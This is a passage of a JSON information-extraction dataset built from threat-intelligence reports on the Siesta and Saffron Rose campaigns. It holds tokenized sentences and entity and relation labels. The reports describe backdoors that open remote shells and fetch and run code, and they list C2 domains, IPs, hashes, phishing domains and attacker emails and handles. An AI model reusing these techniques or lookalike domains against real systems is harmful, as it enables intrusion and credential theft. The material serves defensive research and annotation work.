"an", "d", "Even", "t", "s", "Tech", "n", "ical", "S", "u", "ppor", "t", "Fir", "eEye", "Blogs", "Con", "t", "act", "Us", "About", "FireEye", "New", "sroom", "Incident", "?"], ["Threat", "Research", "+1", "877", "-", "347", "-", "3393", "Customer", "Stories", "Press", "Releases", "Report", "Security", "Issue", "Products", "and", "Services", "Careers", "Webinars", "Contact", "Support", "Executive", "Perspectives", "Partners", "Events", "Customer", "Portal", "Investor", "Relations"], ["Aw", "ards", "and", "Honors", "Communities"], ["Th", "r", "eat", "Map", "Supplier", "Documents", "Email", "Preferences", "Documentation", "Portal", "View", "the", "Latest", "Threats", "Copyright", "\u00a9", "2018", "FireEye", ",", "Inc."], ["All", "rights", "reserved", "."], ["Privacy", "&", "Cookies", "Policy", "|", "Privacy", "Shield", "|", "Legal", "Documentation", "PDFmyURL", "-", "online", "url", "to", "pdf", "conversion", "S", "t", "ay", "Con", "n", "ect", "ed", "\ue904\ue906\ue901\ue903\ue907\ue905", "Site", "Language", "English", "\ue886"]]}, {"vertexSet": [[{"name": "Siesta", "pos": [1, 2], "sent_id": 0, "type": "Campaign"}], [{"name": "Safe", "pos": [3, 4], "sent_id": 3, "type": "Campaign"}], [{"name": "Siesta", "pos": [8, 9], "sent_id": 4, "type": "Campaign"}], [{"name": "Siesta", "pos": [1, 2], "sent_id": 8, "type": "Campaign"}], [{"name": "spear-phishing emails", "pos": [11, 15], "sent_id": 10, "type": "Exploit"}], [{"name": "undisclosed company", "pos": [20, 22], "sent_id": 10, "type": "ExploitTargetObject"}], [{"name": "http://{malicious domain}/{organization name}/{legitimate archive name}.zip", "pos": [29, 34], "sent_id": 13, "type": "File"}], [{"name": "TROJ_SLOTH", "pos": [6, 7], "sent_id": 14, "type": "Dropper"}], [{"name": "google{BLOCKED}.exe", "pos": [5, 6], "sent_id": 17, "type": "Payload"}], [{"name": "http://www.micro{BLOCKED}. com/index.html", "pos": [4, 10], "sent_id": 19, "type": "Indicator"}], [{"name": "BKDR_SLOTH.B", "pos": [6, 7], "sent_id": 20, "type": "Malware"}], [{"name": "Questionaire Concerning the Spread of Superbugs February 2014.exe", "pos": [9, 17], "sent_id": 30, "type": "Dropper"}], [{"name": "014542eafb792b98196954373b3fd13e60cb94fe", "pos": [3, 4], "sent_id": 31, "type": "SHA-1"}], [{"name": "UIODsevr.exe", "pos": [0, 1], "sent_id": 33, "type": "Payload"}], [{"name": "BKDR_SLOTH.B", "pos": [9, 10], "sent_id": 33, "type": "Malware"}], [{"name": "skys{BLOCKED}com", "pos": [19, 20], "sent_id": 33, "type": "Indicator"}], [{"name": "BKDR_SLOTH.A", "pos": [8, 9], "sent_id": 34, "type": "Malware"}], [{"name": "Siesta", "pos": [23, 24], "sent_id": 35, "type": "Campaign"}], [{"name": "sky{BLOCKED}.com", "pos": [6, 7], "sent_id": 44, "type": "Indicator"}], [{"name": "micro{BLOCKED}.com", "pos": [13, 14], "sent_id": 44, "type": "Indicator"}], [{"name": "ifued{BLOCKED}.net", "pos": [15, 16], "sent_id": 44, "type": "Indicator"}], [{"name": "Li Ning", "pos": [5, 7], "sent_id": 45, "type": "Attacker"}], [{"name": "xiaomao{BLOCKED}@163.com", "pos": [14, 15], "sent_id": 45, "type": "Email"}]], "labels": [{"r": "P27", "h": 3, "t": 5, "evidence": [8, 10]}, {"r": "P22", "h": 3, "t": 4, "evidence": [8, 10]}, {"r": "P21", "h": 6, "t": 7, "evidence": [13, 14]}, {"r": "P13", "h": 7, "t": 8, "evidence": [14, 17]}, {"r": "P21", "h": 9, "t": 7, "evidence": [14, 19]}, {"r": "P22", "h": 3, "t": 7, "evidence": [8, 14]}, {"r": "P21", "h": 9, "t": 10, "evidence": [19, 20]}, {"r": "P23", "h": 3, "t": 10, "evidence": [8, 20]}, {"r": "P21", "h": 12, "t": 11, "evidence": [30, 31]}, {"r": "P13", "h": 11, "t": 13, "evidence": [30, 33]}, {"r": "P21", "h": 15, "t": 11, "evidence": [30, 33]}, {"r": "P13", "h": 16, "t": 13, "evidence": [33, 34]}, {"r": "P21", "h": 12, "t": 16, "evidence": [31, 34]}, {"r": "P21", "h": 15, "t": 16, "evidence": [33, 34]}, {"r": "P22", "h": 17, "t": 16, "evidence": [34, 35]}, {"r": "P22", "h": 17, "t": 14, "evidence": [33, 35]}, {"r": "P2", "h": 21, "t": 10, "evidence": [20, 45]}], "title": "201403TrendMicroSiesta", "sents": [["The", "Siesta", "Campaign", ":"], ["A", "New", "Cybercrime", "Operation", "Awakens"], ["In", "the", "past", "few", "weeks", ",", "we", "have", "received", "several", "reports", "of", "targeted", "attacks", "that", "exploited", "various", "application", "vulnerabilities", "to", "infiltrate", "various", "organizations", "."], ["Similar", "to", "the", "Safe", "Campaign", ",", "the", "campaigns", "we", "noted", "went", "seemingly", "unnoticed", "and", "under", "the", "radar", "."], ["The", "attackers", "orchestrating", "the", "campaign", "we", "call", "the", "Siesta", "Campaign", "used", "multicomponent", "malware", "to", "target", "certain", "institutions", "that", "fall", "under", "the", "following", "industries", ":", "Consumer", "goods", "and", "services", "Energy", "Finance"], ["Healthcare", "Media", "and", "telecommunications"], ["Public", "administration", "Security", "and", "defense", "Transport", "and", "traffic", "Threat", "actors", "do", "n\u2019t", "always", "rely", "on", "complex", "attack", "vectors", "to", "infiltrate", "an", "organization", "\u2019s", "network", "."], ["Attackers", "can", "also", "make", "use", "of", "basic", "social", "engineering", "techniques", "for", "their", "victims", "to", "take", "the", "bait", ",", "such", "as", "in", "our", "case", "study", "below", "."], ["The", "Siesta", "Campaign", ":"], ["A", "Case", "Study"], ["We", "are", "currently", "investigating", "an", "incident", "that", "involved", "attackers", "sending", "out", "spear", "-", "phishing", "emails", "addressed", "to", "executives", "of", "an", "undisclosed", "company", "."], ["These", "emails", "were", "sent", "from", "spoofed", "email", "addresses", "of", "personnel", "within", "the", "organization", "."], ["Instead", "of", "using", "attachments", "and", "document", "exploits", ",", "this", "specific", "campaign", "served", "their", "malware", "through", "a", "legitimate", "-", "looking", "file", "download", "link", "."], ["To", "lure", "the", "target", "into", "downloading", "the", "file", ",", "the", "attacker", "serves", "the", "archive", "under", "a", "URL", "path", "named", "after", "the", "target", "organization", "\u2019s", "name", "as", "cited", "below", ":", "http://{malicious", "domain}/{organization", "name}/{legitimate", "archive", "name}.zip"], ["This", "archive", "contains", "an", "executable", "(", "TROJ_SLOTH", ")", "disguised", "as", "a", "PDF", "document", "."], ["When", "executed", ",", "it", "drops", "and", "opens", "a", "valid", "PDF", "file", ",", "which", "was", "most", "probably", "taken", "from", "the", "target", "organization", "\u2019s", "website", "."], ["Along", "with", "this", "valid", "PDF", "file", ",", "another", "malicious", "component", "is", "also", "dropped", "and", "executed", "in", "the", "background", "."], ["This", "backdoor", "component", "is", "named", "google{BLOCKED}.exe", "."], ["(", "Due", "to", "the", "ongoing", "investigation", ",", "we", "are", "unfortunately", "unable", "to", "share", "hashes", "and", "filenames", "at", "this", "time", ".", ")"], ["This", "backdoor", "connects", "to", "http://www.micro{BLOCKED", "}", ".", "com", "/", "index.html", ",", "which", "are", "its", "command", "-", "and", "-", "control", "(", "C&C", ")", "servers", "."], ["Trend", "Micro", "identifies", "these", "samples", "as", "BKDR_SLOTH.B."], ["At", "this", "point", ",", "the", "malware", "begins", "waiting", "for", "additional", "commands", "from", "the", "attacker", "."], ["The", "encrypted", "commands", "that", "are", "accepted", "are", ":"], ["Sleep", ":"], ["Commands", "the", "backdoor", "to", "sleep", "for", "specified", "number", "of", "minutes"], ["We", "have", "received", "a", "sleep", "command", "of", "\u201c", "sleep:120", "\u201d", "during", "our", "analysis", "which", "means", "that", "the", "malware", "will", "wait", "for", "2hrs", "before", "establishing", "a", "connection", "again", "to", "the", "C&C", "server", "Download", ":", "<", "download_url", ">"], ["Commands", "the", "backdoor", "to", "download", "and", "execute", "a", "file", "(", "most", "probably", "another", "Win32", "executable", ")", "from", "a", "specified", "URL"], ["The", "C&C", "servers", "used", "in", "this", "campaign", "are", "found", "to", "be", "newly", "registered", "and", "also", "short", "-", "lived", ",", "making", "it", "difficult", "for", "us", "to", "track", "the", "malware", "\u2019s", "behavior", "."], ["Based", "on", "our", "research", ",", "we", "found", "2", "variants", "of", "the", "malware", "used", "in", "this", "campaign", "."], ["Although", "not", "exactly", "alike", ",", "the", "behaviors", "are", "nearly", "identical", "."], ["One", "of", "the", "similar", "samples", "is", "a", "file", "named", "Questionaire", "Concerning", "the", "Spread", "of", "Superbugs", "February", "2014.exe"], ["(", "SHA1", ":", "014542eafb792b98196954373b3fd13e60cb94fe", ")", "."], ["This", "sample", "drops", "the", "file"], ["UIODsevr.exe", ",", "its", "backdoor", "component", "which", "behaves", "similarly", "as", "BKDR_SLOTH.B", "with", "the", "addition", "of", "communicating", "to", "its", "C&C", "at", "skys{BLOCKED}com", "."], ["These", "samples", "are", "identified", "by", "Trend", "Micro", "as", "BKDR_SLOTH.A."], ["Both", "variants", "excessively", "use", "Sleep", "calls", ",", "which", "renders", "the", "malware", "dormant", "for", "varying", "periods", "of", "time", ",", "hence", "the", "campaign", "name", "\u201c", "Siesta", "\u201d", "(", "which", "means", "to", "take", "a", "short", "nap", "in", "Spanish", ")", "."], ["Commands", "are", "being", "served", "through", "HTML", "pages", "using", "different", "keywords", "as", "listed", "below", ":", "Variant", "1", "prefix", ":", "\u201c", ">", "SC", "<", "\u201d", "Variant", "2", "prefix", ":", "\u201c", "longDesc=", "\u201d", "suffix", ":", "\u201c", ".txt", "\u201d"], ["Listed", "below", "are", "the", "backdoor", "commands", "we", "were", "able", "to", "see", "from", "our", "analysis", ":", "Variant", "1", "\u201c", "run1", "\u201d", "\u2013", "open", "a", "remote", "shell", "\u201c", "run2", "\u201d", "\u2013", "pipe", "shell", "commands", "from", "URL1", "\u201c", "run3", "\u201d", "\u2013", "pipe", "shell", "commands", "from", "URL2", "\u201c", "http", "\u201d", "\u2013", "pipe", "shell", "commands", "from", "C2", "\u201c", "x", "_", "\u201d", "\u2013", "sleep", "for", "specified", "number", "of", "minutes"], ["Variant", "2", "\u201c", "sleep", ":", "\u201d", "\u2013", "sleep", "for", "specified", "number", "of", "minutes", "\u201c", "download", ":", "\u201d", "\u2013", "download", "and", "execute", "another", "executable", "from", "C2"], ["Attribution", "Attribution", "of", "campaigns", "and", "attack", "methods", "can", "often", "be", "difficult", "."], ["We", "were", "able", "to", "identify", "this", "new", "campaign", "through", "inspecting", "hashes", ",", "C&Cs", ",", "registrants", ",", "commands", ",", "and", "additional", "information", "."], ["Figure", "1", "."], ["Attribution", "Graph", "(", "click", "the", "thumbnail", "for", "full", "view", ")"], ["During", "the", "course", "of", "our", "investigation", "into", "this", "new", "campaign", ",", "we", "investigated", "the", "malware", "dropped", "."], ["We", "quickly", "noticed", "the", "registrant", "of", "sky{BLOCKED}.com", "is", "also", "the", "same", "registrant", "as", "micro{BLOCKED}.com", "and", "ifued{BLOCKED}.net", "."], ["This", "individual", "used", "the", "name", "Li", "Ning", "and", "others", "with", "an", "email", "address", "of", "xiaomao{BLOCKED}@163.com", "."], ["This", "individual", "also", "recently", "registered", "79", "additional", "domains", "."], ["There", "are", "a", "total", "of", "roughly", "17,000", "domains", "registered", "with", "this", "same", "email", "address", "."], ["Figure", "2", "."], ["Domains", "registered", "under", "the", "name", "Li", "Ning", ",", "based", "on", "Whois", "data", "Conclusion", "Early", "detection", "is", "crucial", "in", "preventing", "targeted", "attacks", "from", "exfiltrating", "confidential", "company", "data", "."], ["Organizations", "and", "large", "enterprises", "need", "an", "advanced", "threat", "protection", "platform", "like", "Trend", "Micro", "\u2122", "Deep", "Discovery", ",", "which", "can", "mitigate", "the", "risks", "posed", "by", "targeted", "attacks", "through", "its", "various", "security", "technologies", "and", "global", "threat", "intelligence", "."], ["At", "the", "heart", "of", "our", "Custom", "Defense", "solution", "is", "Deep", "Discovery", "which", "provides", "real", "-", "time", "local", "and", "global", "intelligence", "across", "the", "attack", "life", "cycle", "."], ["This", "can", "help", "IT", "administrators", "understand", "the", "nature", "of", "the", "attack", "they", "are", "dealing", "with", "."], ["Trend", "Micro", "blocks", "all", "related", "threats", ",", "emails", "and", "URLs", "associated", "with", "these", "attacks", "."], ["As", "always", ",", "we", "advise", "users", "to", "exercise", "caution", "when", "opening", "emails", "and", "links", "."], ["With", "additional", "insights", "and", "analysis", "from", "Kervin", "Alintanahin", ",", "Dove", "Chiu", ",", "and", "Kyle", "Wilhoit", "."]]}, {"vertexSet": [[{"name": "SAFFRON ROSE", "pos": [3, 5], "sent_id": 0, "type": "Campaign"}], [{"name": "Shamoon", "pos": [17, 18], "sent_id": 14, "type": "Malware"}], [{"name": "Navy Marine Corps Intranet", "pos": [24, 28], "sent_id": 14, "type": "Organization"}], [{"name": "NMCI", "pos": [29, 30], "sent_id": 14, "type": "Organization"}], [{"name": "Ajax Security Team", "pos": [50, 53], "sent_id": 14, "type": "Attacker"}], [{"name": "Iran", "pos": [62, 63], "sent_id": 14, "type": "Country"}], [{"name": "ashiyane[.]org", "pos": [13, 14], "sent_id": 15, "type": "Indicator"}], [{"name": "shabgard[.]org", "pos": [15, 16], "sent_id": 15, "type": "Indicator"}], [{"name": "AjaxTM", "pos": [29, 30], "sent_id": 15, "type": "Attacker"}], [{"name": "Ajax Security Team", "pos": [4, 7], "sent_id": 16, "type": "Attacker"}], [{"name": "Ajax Security Team", "pos": [5, 8], "sent_id": 17, "type": "Attacker"}], [{"name": "Ajax Security Team", "pos": [1, 4], "sent_id": 18, "type": "Attacker"}], [{"name": "Ajax Security Team", "pos": [19, 22], "sent_id": 20, "type": "Attacker"}], [{"name": "FireEye", "pos": [3, 4], "sent_id": 21, "type": "Organization"}], [{"name": "Ajax Security Team", "pos": [8, 11], "sent_id": 21, "type": "Attacker"}], [{"name": "defense industrial base", "pos": [20, 23], "sent_id": 21, "type": "ExploitTargetObject"}], [{"name": "Unites States", "pos": [28, 30], "sent_id": 21, "type": "ExploitTargetObject"}], [{"name": "local Iranian users of anti-censorship technologies", "pos": [35, 43], "sent_id": 21, "type": "ExploitTargetObject"}], [{"name": "Network Crack Program Hacker", "pos": [1, 5], "sent_id": 30, "type": "AttackerGroup"}], [{"name": "Wicked/Withered Rose", "pos": [11, 15], "sent_id": 30, "type": "Attacker"}], [{"name": "U.S. Department of Defense", "pos": [26, 30], "sent_id": 43, "type": "ExploitTargetObject"}], [{"name": "whg", "pos": [9, 10], "sent_id": 44, "type": "Attacker"}], [{"name": "PlugX", "pos": [25, 26], "sent_id": 44, "type": "Malware"}], [{"name": "SOGU", "pos": [0, 1], "sent_id": 45, "type": "Malware"}], [{"name": "Honker Union of China", "pos": [20, 24], "sent_id": 46, "type": "Organization"}], [{"name": "Iran", "pos": [1, 2], "sent_id": 49, "type": "Country"}], [{"name": "Iranian Revolutionary Guard Corps", "pos": [13, 17], "sent_id": 55, "type": "Organization"}], [{"name": "IRGC", "pos": [18, 19], "sent_id": 55, "type": "Organization"}], [{"name": "Basij Cyber Council", "pos": [4, 7], "sent_id": 56, "type": "Attacker"}], [{"name": "Iran", "pos": [11, 12], "sent_id": 57, "type": "Country"}], [{"name": "Shamoon", "pos": [4, 5], "sent_id": 60, "type": "Malware"}], [{"name": "Saudi Arabia", "pos": [12, 14], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "Qatar", "pos": [15, 16], "sent_id": 60, "type": "ExploitTargetObject"}], [{"name": "Stuxnet", "pos": [39, 40], "sent_id": 60, "type": "Malware"}], [{"name": "Flame", "pos": [41, 42], "sent_id": 60, "type": "Malware"}], [{"name": "Ajax Security Team", "pos": [4, 7], "sent_id": 100, "type": "Attacker"}], [{"name": "sending email", "pos": [4, 6], "sent_id": 101, "type": "Vector"}], [{"name": "private messages via social media", "pos": [7, 12], "sent_id": 101, "type": "Vector"}], [{"name": "fake login pages", "pos": [13, 16], "sent_id": 101, "type": "Vector"}], [{"name": "propagation of anti-censorship software", "pos": [19, 25], "sent_id": 101, "type": "Vector"}], [{"name": "aeroconf2014[.]org", "pos": [6, 7], "sent_id": 105, "type": "Indicator"}], [{"name": "Psiphon", "pos": [17, 18], "sent_id": 122, "type": "Software"}], [{"name": "Ultrasurf", "pos": [19, 20], "sent_id": 122, "type": "Software"}], [{"name": "Stealer", "pos": [2, 3], "sent_id": 134, "type": "Malware"}], [{"name": "Ajax Security Team", "pos": [4, 7], "sent_id": 135, "type": "Attacker"}], [{"name": "Stealer", "pos": [17, 18], "sent_id": 135, "type": "MalwareFamily"}], [{"name": "IntelRS.exe", "pos": [10, 11], "sent_id": 137, "type": "Dropper"}], [{"name": "IntelRS.exe", "pos": [1, 2], "sent_id": 141, "type": "Dropper"}], [{"name": "Stealer", "pos": [11, 12], "sent_id": 141, "type": "Malware"}], [{"name": "AppTransferWiz.dll", "pos": [4, 5], "sent_id": 142, "type": "File"}], [{"name": "IntelRS.exe", "pos": [1, 2], "sent_id": 143, "type": "Dropper"}], [{"name": "DelphiNative.dll", "pos": [8, 9], "sent_id": 143, "type": "File"}], [{"name": "IntelRS.exe.config", "pos": [23, 24], "sent_id": 143, "type": "File"}], [{"name": "AppTransferWiz.dll", "pos": [3, 4], "sent_id": 144, "type": "File"}], [{"name": "RapidStartTech.stl", "pos": [11, 12], "sent_id": 144, "type": "File"}], [{"name": "AppTransferWiz.dll", "pos": [0, 1], "sent_id": 146, "type": "File"}], [{"name": "IntelRS.exe", "pos": [30, 31], "sent_id": 151, "type": "Malware"}], [{"name": "AppTransferWiz.DLL", "pos": [35, 38], "sent_id": 151, "type": "File"}], [{"name": "sqlite3.dll", "pos": [46, 47], "sent_id": 151, "type": "File"}], [{"name": "IntelRS.exe", "pos": [0, 1], "sent_id": 152, "type": "Malware"}], [{"name": "AppTransferWiz.DLL", "pos": [8, 11], "sent_id": 152, "type": "File"}], [{"name": "IntelRS.exe", "pos": [24, 25], "sent_id": 153, "type": "Malware"}], [{"name": "IntelRS.exe", "pos": [39, 40], "sent_id": 153, "type": "Malware"}], [{"name": "DelphiNative.DLL", "pos": [45, 48], "sent_id": 153, "type": "Payload"}], [{"name": "Stealer", "pos": [1, 2], "sent_id": 156, "type": "Malware"}], [{"name": "vaultcli.DLL", "pos": [5, 8], "sent_id": 157, "type": "Payload"}], [{"name": "Rijndael cipher", "pos": [12, 14], "sent_id": 170, "type": "Obfuscation"}], [{"name": "AES", "pos": [20, 21], "sent_id": 170, "type": "Obfuscation"}], [{"name": "HavijeBaba", "pos": [28, 29], "sent_id": 171, "type": "Password"}], [{"name": "salam!*%#", "pos": [35, 37], "sent_id": 171, "type": "Indicator"}], [{"name": "Saffron Rose", "pos": [3, 5], "sent_id": 177, "type": "Campaign"}], [{"name": "6dc7cc33a3cdcfee6c4edb6c085b869d", "pos": [26, 27], "sent_id": 180, "type": "MD5"}], [{"name": "3d26442f06b34df3d5921f89bf680ee9", "pos": [12, 13], "sent_id": 181, "type": "MD5"}], [{"name": "3efd971db6fbae08e96535478888cff9", "pos": [1, 2], "sent_id": 182, "type": "MD5"}], [{"name": "288c91d6c0197e99b92c06496921bf2f", "pos": [1, 2], "sent_id": 183, "type": "MD5"}], [{"name": "2013-10-29", "pos": [20, 25], "sent_id": 186, "type": "Time"}], [{"name": "2014-03-15", "pos": [26, 31], "sent_id": 186, "type": "Time"}], [{"name": "2014-3-15", "pos": [9, 14], "sent_id": 187, "type": "Time"}], [{"name": "Saffron Rose", "pos": [3, 5], "sent_id": 192, "type": "Campaign"}], [{"name": "d:\\svn\\Stealer\\source\\Stealer\\Stealer\\obj\\ x86\\Release\\Stealer.pdb", "pos": [17, 19], "sent_id": 194, "type": "Indicator"}], [{"name": "f:\\Projects\\C#\\Stealer\\source\\Stealer\\ Stealer\\obj\\x86\\Release\\Stealer.pdb", "pos": [20, 22], "sent_id": 194, "type": "Indicator"}], [{"name": "5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3", "pos": [23, 25], "sent_id": 199, "type": "SHA-256"}], [{"name": "Stealer.exe", "pos": [5, 6], "sent_id": 203, "type": "Malware"}], [{"name": "Ajax Security Team", "pos": [15, 18], "sent_id": 215, "type": "Attacker"}], [{"name": "Stealer Builder", "pos": [7, 9], "sent_id": 216, "type": "Exploit"}], [{"name": "2014-04-08", "pos": [13, 18], "sent_id": 216, "type": "Time"}], [{"name": "Stealer Builder", "pos": [16, 18], "sent_id": 225, "type": "Malware"}], [{"name": "2013-12-19", "pos": [22, 27], "sent_id": 225, "type": "Time"}], [{"name": "1823b77b9ee6296a8b997ffb64d32d21", "pos": [4, 5], "sent_id": 227, "type": "MD5"}], [{"name": "5156aca994ecfcb40458ead8c830cd66469d5f5 a031392898d323a8d7a7f23d3", "pos": [8, 10], "sent_id": 228, "type": "SHA-256"}], [{"name": "Ajax Security Team", "pos": [3, 6], "sent_id": 233, "type": "Attacker"}], [{"name": "RapidStartTech.stl", "pos": [17, 18], "sent_id": 233, "type": "File"}], [{"name": "RapidStartTech.stl", "pos": [5, 6], "sent_id": 234, "type": "File"}], [{"name": "Saffron Rose", "pos": [3, 5], "sent_id": 237, "type": "Campaign"}], [{"name": "aeroconf2014[.]org", "pos": [9, 10], "sent_id": 240, "type": "Indicator"}], [{"name": "info@usa.gov[.]us", "pos": [15, 16], "sent_id": 240, "type": "Indicator"}], [{"name": "keyvan.ajaxtm@gmail[.]com", "pos": [12, 13], "sent_id": 241, "type": "Email"}], [{"name": "ajaxtm[.]org", "pos": [20, 21], "sent_id": 241, "type": "Indicator"}], [{"name": "Ajax Security Team", "pos": [26, 29], "sent_id": 241, "type": "Attacker"}], [{"name": "Google", "pos": [21, 22], "sent_id": 242, "type": "Organization"}], [{"name": "Facebook", "pos": [23, 24], "sent_id": 242, "type": "Organization"}], [{"name": "Yahoo", "pos": [25, 26], "sent_id": 242, "type": "Organization"}], [{"name": "LinkedIn", "pos": [27, 28], "sent_id": 242, "type": "Organization"}], [{"name": "Saffron Rose", "pos": [3, 5], "sent_id": 243, "type": "Campaign"}], [{"name": "intel-update[.]com", "pos": [9, 12], "sent_id": 245, "type": "Indicator"}], [{"name": "update-mirror[.]com", "pos": [13, 16], "sent_id": 245, "type": "Indicator"}], [{"name": "james.mateo@aim[.]com", "pos": [21, 22], "sent_id": 245, "type": "Indicator"}], [{"name": "intel-update[.]com", "pos": [2, 5], "sent_id": 246, "type": "Indicator"}], [{"name": "88.150.227.197", "pos": [10, 11], "sent_id": 246, "type": "Address"}], [{"name": "osshom@yahoo[.]com", "pos": [40, 41], "sent_id": 246, "type": "Email"}], [{"name": "intelupdate[.]com", "pos": [11, 12], "sent_id": 247, "type": "Indicator"}], [{"name": "ultrasms[.]ir", "pos": [13, 14], "sent_id": 247, "type": "Indicator"}], [{"name": "lvlr98@gmail[.]com", "pos": [19, 20], "sent_id": 247, "type": "Email"}], [{"name": "Saffron Rose", "pos": [3, 5], "sent_id": 248, "type": "Campaign"}], [{"name": "5.9.244.151", "pos": [17, 18], "sent_id": 248, "type": "Address"}], [{"name": "ns2. aeroconf2014[.]org", "pos": [25, 28], "sent_id": 248, "type": "Indicator"}], [{"name": "office.windowsessentials[.]tk", "pos": [29, 30], "sent_id": 248, "type": "Indicator"}], [{"name": "1d4d9f6e6fa1a07cb0a66a9ee06d624a", "pos": [10, 11], "sent_id": 249, "type": "MD5"}], [{"name": "Stealer", "pos": [4, 5], "sent_id": 250, "type": "Malware"}], [{"name": "intel-update[.]com", "pos": [11, 14], "sent_id": 250, "type": "Indicator"}], [{"name": "81.17.28.235", "pos": [11, 12], "sent_id": 251, "type": "Address"}], [{"name": "pluginadobe[.]com", "pos": [6, 7], "sent_id": 253, "type": "Indicator"}], [{"name": "Iran", "pos": [84, 85], "sent_id": 256, "type": "ExploitTargetObject"}], [{"name": "yahoomail.com.co", "pos": [6, 7], "sent_id": 258, "type": "Indicator"}], [{"name": "81.17.28.227", "pos": [7, 8], "sent_id": 258, "type": "Address"}], [{"name": "2013-11-28", "pos": [8, 13], "sent_id": 258, "type": "Time"}], [{"name": "2014-4-10", "pos": [13, 18], "sent_id": 258, "type": "Time"}], [{"name": "xn--google-yri.com", "pos": [18, 19], "sent_id": 258, "type": "Indicator"}], [{"name": "81.17.28.229", "pos": [19, 20], "sent_id": 258, "type": "Address"}], [{"name": "2013-12-08", "pos": [20, 25], "sent_id": 258, "type": "Time"}], [{"name": "2014-01-15", "pos": [25, 30], "sent_id": 258, "type": "Time"}], [{"name": "privacy-google.com", "pos": [30, 31], "sent_id": 258, "type": "Indicator"}], [{"name": "appleid.com.co", "pos": [31, 32], "sent_id": 258, "type": "Indicator"}], [{"name": "accounts-apple.com", "pos": [32, 33], "sent_id": 258, "type": "Indicator"}], [{"name": "users-facebook.com", "pos": [0, 1], "sent_id": 259, "type": "Indicator"}], [{"name": "81.17.28.229", "pos": [1, 2], "sent_id": 259, "type": "Address"}], [{"name": "81.17.28.231", "pos": [2, 3], "sent_id": 259, "type": "Address"}], [{"name": "81.17.28.231", "pos": [3, 4], "sent_id": 259, "type": "Address"}], [{"name": "81.17.28.231", "pos": [4, 5], "sent_id": 259, "type": "Address"}], [{"name": "xn--facebook-06k.com", "pos": [5, 6], "sent_id": 259, "type": "Indicator"}], [{"name": "81.17.28.231", "pos": [6, 7], "sent_id": 259, "type": "Address"}], [{"name": "2014-02-14", "pos": [33, 38], "sent_id": 259, "type": "Time"}], [{"name": "2014-02-20", "pos": [38, 43], "sent_id": 259, "type": "Time"}], [{"name": "2013-12-31", "pos": [43, 48], "sent_id": 259, "type": "Time"}], [{"name": "2014-01-15", "pos": [48, 53], "sent_id": 259, "type": "Time"}], [{"name": "2013-11-27", "pos": [53, 58], "sent_id": 259, "type": "Time"}], [{"name": "2014-02-23", "pos": [58, 63], "sent_id": 259, "type": "Time"}], [{"name": "2014-02-20", "pos": [63, 68], "sent_id": 259, "type": "Time"}], [{"name": "2014-02-20", "pos": [68, 73], "sent_id": 259, "type": "Time"}], [{"name": "2014-01-15", "pos": [73, 78], "sent_id": 259, "type": "Time"}], [{"name": "2014-03-07", "pos": [78, 83], "sent_id": 259, "type": "Time"}], [{"name": "Ajax Security Team", "pos": [1, 4], "sent_id": 260, "type": "AttackerGroup"}], [{"name": "HUrr!c4nE!", "pos": [13, 15], "sent_id": 260, "type": "Attacker"}], [{"name": "Cair3x", "pos": [18, 19], "sent_id": 260, "type": "Attacker"}], [{"name": "0day", "pos": [4, 5], "sent_id": 261, "type": "Attacker"}], [{"name": "Mohammad PK", "pos": [8, 10], "sent_id": 261, "type": "Attacker"}], [{"name": "Crim3r", "pos": [13, 14], "sent_id": 261, "type": "Attacker"}], [{"name": "Ajax Security Team", "pos": [1, 4], "sent_id": 262, "type": "AttackerGroup"}], [{"name": "ajaxtm[.]org", "pos": [6, 7], "sent_id": 262, "type": "Indicator"}], [{"name": "ajaxtm[.]org", "pos": [5, 6], "sent_id": 277, "type": "Indicator"}], [{"name": "HUrr!c4nE", "pos": [9, 10], "sent_id": 277, "type": "Attacker"}], [{"name": "k3yv4n", "pos": [15, 16], "sent_id": 277, "type": "Attacker"}], [{"name": "HUrr!c4nE!", "pos": [1, 3], "sent_id": 278, "type": "Attacker"}], [{"name": "ajaxtm[.]org", "pos": [3, 4], "sent_id": 279, "type": "Indicator"}], [{"name": "keyvan.ajaxtm@gmail[.]com", "pos": [10, 11], "sent_id": 279, "type": "Email"}], [{"name": "aerospace2014[.]org", "pos": [11, 12], "sent_id": 280, "type": "Indicator"}]], "labels": [{"r": "P32", "h": 4, "t": 5, "evidence": [14]}, {"r": "P3", "h": 19, "t": 18, "evidence": [30]}, {"r": "P2", "h": 21, "t": 22, "evidence": [44]}, {"r": "P2", "h": 21, "t": 23, "evidence": [44, 45]}, {"r": "P32", "h": 28, "t": 29, "evidence": [56, 57]}, {"r": "P14", "h": 46, "t": 45, "evidence": [135, 137]}, {"r": "P16", "h": 45, "t": 46, "evidence": [135, 137]}, {"r": "P29", "h": 44, "t": 46, "evidence": [135, 137]}, {"r": "P21", "h": 49, "t": 47, "evidence": [141, 142]}, {"r": "P21", "h": 49, "t": 48, "evidence": [141, 142]}, {"r": "P21", "h": 51, "t": 48, "evidence": [141, 143]}, {"r": "P21", "h": 52, "t": 48, "evidence": [141, 143]}, {"r": "P21", "h": 53, "t": 48, "evidence": [141, 144]}, {"r": "P21", "h": 54, "t": 48, "evidence": [141, 144]}, {"r": "P21", "h": 57, "t": 56, "evidence": [151]}, {"r": "P21", "h": 58, "t": 56, "evidence": [151]}, {"r": "P21", "h": 60, "t": 59, "evidence": [152]}, {"r": "P13", "h": 62, "t": 63, "evidence": [153]}, {"r": "P13", "h": 64, "t": 65, "evidence": [156, 157]}, {"r": "P21", "h": 81, "t": 82, "evidence": [199, 203]}, {"r": "P33", "h": 83, "t": 85, "evidence": [215, 216]}, {"r": "P33", "h": 86, "t": 87, "evidence": [225]}, {"r": "P21", "h": 88, "t": 86, "evidence": [225, 227]}, {"r": "P21", "h": 89, "t": 86, "evidence": [225, 228]}, {"r": "P21", "h": 117, "t": 118, "evidence": [249, 250]}, {"r": "P21", "h": 115, "t": 118, "evidence": [248, 250]}, {"r": "P21", "h": 116, "t": 118, "evidence": [248, 250]}, {"r": "P28", "h": 118, "t": 114, "evidence": [248, 250]}, {"r": "P22", "h": 113, "t": 118, "evidence": [248, 250]}, {"r": "P21", "h": 119, "t": 118, "evidence": [250]}, {"r": "P28", "h": 118, "t": 120, "evidence": [250, 251]}, {"r": "P21", "h": 121, "t": 118, "evidence": [250, 253]}, {"r": "P3", "h": 152, "t": 151, "evidence": [260]}, {"r": "P3", "h": 153, "t": 151, "evidence": [260]}, {"r": "P3", "h": 154, "t": 151, "evidence": [260, 261]}, {"r": "P3", "h": 156, "t": 151, 